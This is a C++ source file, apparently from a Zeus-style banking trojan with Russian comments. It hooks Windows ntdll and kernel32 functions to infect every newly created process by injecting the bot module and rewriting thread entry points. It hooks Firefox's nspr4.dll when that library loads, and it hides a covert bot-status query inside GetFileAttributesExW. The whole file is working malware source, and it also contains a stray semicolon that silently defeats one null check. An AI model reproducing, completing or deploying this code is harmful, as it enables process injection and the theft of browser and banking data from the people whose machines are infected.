#include <windows.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "winapitables.h"
#include "coreinstall.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\process.h"

#if defined(HOOKER_LDRLOADDLL)

#  if(BO_NSPR4 > 0)
#    define LDRGETDLLHANDLEFLAG_HOOKED_NSPR4 0x1
#  endif

  static CRITICAL_SECTION     hookerLdrLoadDllCriticalSection; //Критическая секция для hookerLdrLoadDll.
  static DWORD                ldrGetDllHandleFlags;
#endif

#if defined HOOKER_NTCREATEFILE
  static DWORD ntCreateFileTlsIndex;
#endif

#if defined HOOKER_SETCHILDPROCESSFLAGS
  static DWORD processFlagsTlsIndex; //TLS-индекс для создания с processFlags, для создания дочерного процесса.
#endif

void CoreHook::init(void)
{
  //Инициализации для hookerLdrLoadDll.
#if defined(HOOKER_LDRLOADDLL)
  CWA(kernel32, InitializeCriticalSection)(&hookerLdrLoadDllCriticalSection);
  ldrGetDllHandleFlags = 0;
#endif
#if defined(HOOKER_NTCREATEFILE)
  ntCreateFileTlsIndex = CWA(kernel32, TlsAlloc)();
  if(ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES)CWA(kernel32, TlsSetValue)(ntCreateFileTlsIndex, (void *)0);
#endif

#if defined HOOKER_SETCHILDPROCESSFLAGS
  processFlagsTlsIndex = TLS_OUT_OF_INDEXES;
#endif
}

void CoreHook::uninit(void)
{

}

void CoreHook::disableFileHookerForCurrentThread(bool disable)
{
#if defined(HOOKER_NTCREATEFILE)
  CWA(kernel32, TlsSetValue)(ntCreateFileTlsIndex, (void *)(disable ? 1 : 0));
#endif
}

/*
  Получение текущих флагов для дочерного потока, и его сброс.
  
  Return - Core::CDPF_*.
*/
static DWORD getChildProcessFlags(void)
{
#if defined HOOKER_SETCHILDPROCESSFLAGS
  DWORD r = 0;
  if(processFlagsTlsIndex != TLS_OUT_OF_INDEXES)
  {
    r = (DWORD)CWA(kernel32, TlsGetValue)(processFlagsTlsIndex);
    CWA(kernel32, TlsSetValue)(processFlagsTlsIndex, 0);
  }
  return r;
#else
  return 0;
#endif
}

#if defined HOOKER_SETCHILDPROCESSFLAGS
bool CoreHook::setChildProcessFlags(DWORD processFlags)
{
  bool r = false;
  if(processFlagsTlsIndex != TLS_OUT_OF_INDEXES || (processFlagsTlsIndex = CWA(kernel32, TlsAlloc)()) != TLS_OUT_OF_INDEXES)
  {
    if(CWA(kernel32, TlsSetValue)(processFlagsTlsIndex, (void *)processFlags) != 0)r = true;
  }
  return r;
}
#endif

#if(BO_NSPR4 > 0)
void CoreHook::markNspr4AsHooked(void)
{
  ldrGetDllHandleFlags |= LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
}
#endif

NTSTATUS NTAPI CoreHook::hookerNtCreateThread(PHANDLE threadHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, HANDLE processHandle, PCLIENT_ID clientId, PCONTEXT threadContext, PINITIAL_TEB initialTeb, BOOLEAN createSuspended)
{
  //WDEBUG0(WDDT_INFO, "Called");

  DWORD pbiSize;
  PROCESS_BASIC_INFORMATION pbi;

  if(Core::isActive() && NT_SUCCESS(coreData.ntdllApi.ntQueryInformationProcess(processHandle, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &pbiSize)) && pbi.PebBaseAddress != 0)
  {
    DWORD threadsCount = pbi.UniqueProcessId == 0 ? 0 : Process::_getCountOfThreadsByProcessId(pbi.UniqueProcessId);
    if(threadsCount == 0)
    {
      //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
      HANDLE mutexOfProcess = Core::createMutexOfProcess(pbi.UniqueProcessId);
      if(mutexOfProcess == NULL)
      {
        WDEBUG1(WDDT_WARNING, "Process %u already infected.", pbi.UniqueProcessId);
      }
      else
      {
        void *image = Core::initNewModule(processHandle, mutexOfProcess, getChildProcessFlags());
        if(image != NULL)
        {
          DWORD_PTR entry = (DWORD_PTR)((LPBYTE)Core::_injectEntryForModuleEntry - (LPBYTE)coreData.modules.current);
          entry += (DWORD_PTR)(LPBYTE)image;
        
          if(coreData.proccessFlags & Core::CDPF_DISABLE_CREATEPROCESS)entry ^= threadContext->Eax;

#         if defined _WIN64
#           error FIXME
#         else
            //threadContext->Eax - указывает на точку входа оригинального модуля.
            threadContext->Eax = entry;
#         endif
        }
        CWA(kernel32, CloseHandle)(mutexOfProcess);
      }
    }
  }
  
  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
  return coreData.ntdllApi.ntCreateThread(threadHandle, desiredAccess, objectAttributes, processHandle, clientId, threadContext, initialTeb, createSuspended);
}

NTSTATUS NTAPI CoreHook::hookerNtCreateUserProcess(PHANDLE processHandle, PHANDLE threadHandle, ACCESS_MASK processDesiredAccess, ACCESS_MASK threadDesiredAccess, POBJECT_ATTRIBUTES processObjectAttributes, POBJECT_ATTRIBUTES threadObjectAttributes, ULONG createProcessFlags, ULONG createThreadFlags, PVOID processParameters, PVOID parameter9, PVOID attributeList)
{
  WDEBUG0(WDDT_INFO, "Called");
  
  //Не проверяем, т.к доступность функции определяется в ходе установки хуков.
  NTSTATUS retVal = coreData.ntdllApi.ntCreateUserProcess(processHandle, threadHandle, processDesiredAccess, threadDesiredAccess, processObjectAttributes, threadObjectAttributes, createProcessFlags, createThreadFlags, processParameters, parameter9, attributeList);
  DWORD pid;
  if(NT_SUCCESS(retVal) && createThreadFlags & CREATE_THREAD_SUSPENDED && processHandle != NULL && threadHandle != NULL && Core::isActive() && (pid = CWA(kernel32, GetProcessId)(*processHandle)) != 0)
  {
    //FIXME: Запретить инфецирования процессов в других пользовтоелях и сессиях.
    HANDLE mutexOfProcess = Core::createMutexOfProcess(pid);
    if(mutexOfProcess == NULL)
    {
      WDEBUG1(WDDT_WARNING, "Process %u already infected.", pid);
    }
    else
    {
      void *image = Core::initNewModule(*processHandle, mutexOfProcess, getChildProcessFlags());
      if(image != NULL);
      {
        bool ok = false;
        DWORD_PTR entry = (DWORD_PTR)((LPBYTE)Core::_injectEntryForModuleEntry - (LPBYTE)coreData.modules.current);
        entry += (DWORD_PTR)(LPBYTE)image;

#       if defined _WIN64
#         error FIXME
#       else
        {
          //Сейчас поток находится на точки входа RtlUserThreadStart, для которой eax ранвяется точки
          //входа модуля.
          CONTEXT context;
          context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
      
          if(CWA(kernel32, GetThreadContext)(*threadHandle, &context) == 0)
          {
            WDEBUG0(WDDT_ERROR, "GetThreadContext failed .");
          }
          else if(context.Eip != (DWORD)coreData.ntdllApi.rtlUserThreadStart)
          {
            WDEBUG2(WDDT_ERROR, "Bad context.Eip, current 0x%08X, needed 0x%08X", context.Eip, coreData.ntdllApi.rtlUserThreadStart);
          }
          else
          {
            //FIXME
            if(coreData.proccessFlags & Core::CDPF_DISABLE_CREATEPROCESS)entry ^= context.Eax;
            
            context.Eax = entry;
            context.ContextFlags = CONTEXT_INTEGER;
            if(CWA(kernel32, SetThreadContext)(*threadHandle, &context) == 0)
            {
              WDEBUG0(WDDT_ERROR, "SetThreadContext failed");
            }
            else ok = true;
          }
        }
#       endif
        if(ok == false)CWA(kernel32, VirtualFreeEx)(*processHandle, image, 0, MEM_RELEASE);
      }     
      CWA(kernel32, CloseHandle)(mutexOfProcess);
    }
  }
  return retVal;
}

#if defined(HOOKER_LDRLOADDLL)
NTSTATUS NTAPI CoreHook::hookerLdrLoadDll(PWCHAR pathToFile, ULONG flags, PUNICODE_STRING moduleFileName, PHANDLE moduleHandle)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.

  if(!Core::isActive())return coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);

  //WARN: НЕ защищать вызовы этих апи объектами синхроризаций!
  NTSTATUS status1 = coreData.ntdllApi.ldrGetDllHandle(pathToFile, NULL, moduleFileName, moduleHandle);
  NTSTATUS status2 = coreData.ntdllApi.ldrLoadDll(pathToFile, flags, moduleFileName, moduleHandle);
  
  if(!NT_SUCCESS(status1) && NT_SUCCESS(status2) && moduleHandle != NULL && *moduleHandle != NULL && moduleFileName != NULL)
  {
    CWA(kernel32, EnterCriticalSection)(&hookerLdrLoadDllCriticalSection);
    WDEBUG1(WDDT_INFO, "Loaded, moduleFileName=%s", moduleFileName->Buffer);
#   if(BO_NSPR4 > 0)
    {
      if((ldrGetDllHandleFlags & LDRGETDLLHANDLEFLAG_HOOKED_NSPR4) == 0)
      {
        if(WinApiTables::_trySetNspr4HooksEx(moduleFileName->Buffer, (HMODULE)*moduleHandle))
        {
          WDEBUG0(WDDT_INFO, "Hooks installed for nspr4.dll");
          //ldrGetDllHandleFlags |= LDRGETDLLHANDLEFLAG_HOOKED_NSPR4;
          markNspr4AsHooked();
        }
      }
    }
#   endif
    CWA(kernel32, LeaveCriticalSection)(&hookerLdrLoadDllCriticalSection);
  }
  return status2;
}
#endif

#if(0) //Может пригодиться когда нибудь...
NTSTATUS NTAPI CoreHook::hookerNtQueryDirectoryFile(HANDLE fileHandle, HANDLE eventHandle, PIO_APC_ROUTINE apcRoutine, PVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, PVOID fileInformation, ULONG length, FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
  
  NTSTATUS status = coreData.ntdllApi.ntQueryDirectoryFile(fileHandle, eventHandle, apcRoutine, apcContext, ioStatusBlock, fileInformation, length, fileInformationClass, returnSingleEntry, fileName, restartScan);
  if(!Core::isActive())return status;
  
  if(NT_SUCCESS(status) && fileInformation != NULL)
  {
    //FIXME: Дописать.

    DWORD_PTR fileNameOffset;
    DWORD_PTR fileNameSizeOffset;
    
    switch(fileInformationClass)
    {
      default: return status;
      
      case FileDirectoryInformation:
        fileNameOffset     = OFFSETOF(FILE_DIRECTORY_INFORMATION, FileName);
        fileNameSizeOffset = OFFSETOF(FILE_DIRECTORY_INFORMATION, FileNameLength);
        break;
      
      case FileFullDirectoryInformation:
        fileNameOffset     = OFFSETOF(FILE_FULL_DIR_INFORMATION, FileName);
        fileNameSizeOffset = OFFSETOF(FILE_FULL_DIR_INFORMATION, FileNameLength);
        break;

      case FileIdFullDirectoryInformation:
        fileNameOffset     = OFFSETOF(FILE_ID_FULL_DIR_INFORMATION, FileName);
        fileNameSizeOffset = OFFSETOF(FILE_ID_FULL_DIR_INFORMATION, FileNameLength);
        break;
      
      case FileBothDirectoryInformation:
        fileNameOffset     = OFFSETOF(FILE_BOTH_DIR_INFORMATION, FileName);
        fileNameSizeOffset = OFFSETOF(FILE_BOTH_DIR_INFORMATION, FileNameLength);
        break;

      case FileIdBothDirectoryInformation:
        fileNameOffset     = OFFSETOF(FILE_ID_BOTH_DIR_INFORMATION, FileName);
        fileNameSizeOffset = OFFSETOF(FILE_ID_BOTH_DIR_INFORMATION, FileNameLength);
        break;

      case FileNamesInformation:
        fileNameOffset     = OFFSETOF(FILE_NAMES_INFORMATION, FileName);
        fileNameSizeOffset = OFFSETOF(FILE_NAMES_INFORMATION, FileNameLength);
        break;
    }
    
    //WDEBUG1(WDDT_INFO, "fileInformationClass=%u", fileInformationClass); //Возможна рекруссия.
  }

  return status;
}
#endif

#if defined HOOKER_NTCREATEFILE
NTSTATUS NTAPI CoreHook::hookerNtCreateFile(PHANDLE fileHandle, ACCESS_MASK desiredAccess, POBJECT_ATTRIBUTES objectAttributes, PIO_STATUS_BLOCK ioStatusBlock, PLARGE_INTEGER allocationSize, ULONG fileAttributes, ULONG shareAccess, ULONG createDisposition, ULONG createOptions, PVOID eaBuffer, ULONG eaLength)
{
  //WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.

  if(createDisposition == FILE_OPEN &&                                                                                       //Открывается сущетвущий файл.
     (desiredAccess & (GENERIC_READ | FILE_READ_DATA)) &&
     (desiredAccess & (GENERIC_ALL | GENERIC_EXECUTE | GENERIC_WRITE |
     FILE_WRITE_DATA | FILE_ADD_FILE | FILE_APPEND_DATA | FILE_ADD_SUBDIRECTORY | FILE_CREATE_PIPE_INSTANCE | FILE_WRITE_EA | FILE_WRITE_ATTRIBUTES |
     FILE_EXECUTE | FILE_TRAVERSE | FILE_DELETE_CHILD | DELETE | WRITE_DAC | WRITE_OWNER)) == 0 &&
     (createOptions & (FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT | FILE_DELETE_ON_CLOSE | FILE_OPEN_BY_FILE_ID)) == 0 && //Прочие плохие признаки.

     objectAttributes != NULL && objectAttributes->Length >= sizeof(OBJECT_ATTRIBUTES) && objectAttributes->ObjectName != NULL &&
     objectAttributes->ObjectName->Buffer != NULL && objectAttributes->ObjectName->Length > 4 * sizeof(WCHAR) && (objectAttributes->ObjectName->Length % sizeof(WCHAR)) == 0 && /*параноя*/

     ntCreateFileTlsIndex != TLS_OUT_OF_INDEXES && CWA(kernel32, TlsGetValue)(ntCreateFileTlsIndex) == (void *)0 &&          //Защита от рекруссии.

     Core::isActive()
    )
  {
    DWORD fileNameSize = objectAttributes->ObjectName->Length / sizeof(WCHAR);
    LPWSTR fileName    = objectAttributes->ObjectName->Buffer;

    //Проверяем префикс.
    if(fileName[0] == '\\' && fileName[1] == '?' && fileName[2] == '?' && fileName[3] == '\\')
    {
      fileName     += 4;
      fileNameSize -= 4;
    }

    //Принимаем только локальные пути. 
    if(fileNameSize > 4)
    {
      signed char isUnc = -1;

      //Локальный файл.
      if(fileName[1] == ':' && fileName[2] == '\\' && ((fileName[0] >= 'A' && fileName[0] <= 'Z') || (fileName[0] >= 'a' && fileName[0] <= 'z')))isUnc = 0;
      //UNC
      else if(fileName[0] == '\\' && fileName[1] == '\\' && fileName[2] != '\\')isUnc = 1;
      //FIXME: GetFullPathName, работать с отностиетльными именами.

      if(isUnc != -1)
      {
        LPWSTR safeFileName = Str::_CopyExW(fileName, fileNameSize);
        if(safeFileName != NULL)
        {
          disableFileHookerForCurrentThread(true);
          WDEBUG4(WDDT_INFO, "createDisposition=0x%08X, desiredAccess=0x%08X, createOptions=0x%08X, fileName=%s", createDisposition, desiredAccess, createOptions, fileName);

          //...

          disableFileHookerForCurrentThread(false);
          Mem::free(safeFileName);
        }
      }
    }
  }

  return coreData.ntdllApi.ntCreateFile(fileHandle, desiredAccess, objectAttributes, ioStatusBlock, allocationSize, fileAttributes, shareAccess, createDisposition, createOptions, eaBuffer, eaLength);
}
#endif

BOOL WINAPI CoreHook::hookerGetFileAttributesExW(LPCWSTR fileName, GET_FILEEX_INFO_LEVELS infoLevelId, LPVOID fileInformation)
{
  WDEBUG0(WDDT_INFO, "Called"); //Возможна рекруссия.
  if(infoLevelId == Core::OBJECT_ID_BOT_STATUS_SECRET && fileName != NULL && Core::isActive() && Str::_CompareW(fileName, coreData.installId, -1, 38/*GUID_SIZE*/) == 0)
  {
    WDEBUG0(WDDT_INFO, "Detected request of status of bot.");
    
    BotStatus::VER1 *bs = (BotStatus::VER1 *)CWA(kernel32, VirtualAlloc)(NULL, ALIGN_UP(sizeof(BotStatus::VER1), VM_PAGE_SIZE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(bs != NULL)
    {
      CoreInstall::_loadUpdateData(bs);
      *((BotStatus::VER1 **)fileInformation) = bs;
      return TRUE;
    }
  }
  
  return CWA(kernel32, GetFileAttributesExW)(fileName, infoLevelId, fileInformation);
}
